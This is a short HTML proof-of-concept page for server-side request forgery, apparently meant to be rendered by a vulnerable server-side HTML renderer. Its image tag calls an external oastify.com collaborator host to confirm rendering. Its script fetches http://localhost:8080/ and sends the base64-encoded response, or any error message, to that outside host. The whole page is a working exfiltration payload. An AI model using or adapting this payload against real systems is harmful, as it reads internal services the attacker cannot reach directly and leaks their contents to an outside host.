<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF PoC</title>
</head>

<body>
    <h1>Hello</h1>
    <img src="https://7ckynm4bbdnzholqxgv1rahydpjg7cv1.oastify.com/?ItsRenderingHtml">
    <script>
        fetch("http://localhost:8080/")
            .then(res => res.text())
            .then(body => {
                new Image().src = "https://7ckynm4bbdnzholqxgv1rahydpjg7cv1.oastify.com/?data=" + btoa(body);
            })
            .catch(e => {
                new Image().src = "https://7ckynm4bbdnzholqxgv1rahydpjg7cv1.oastify.com/?error=" + encodeURIComponent(e.message);
            });
    </script>

</body>

</html>
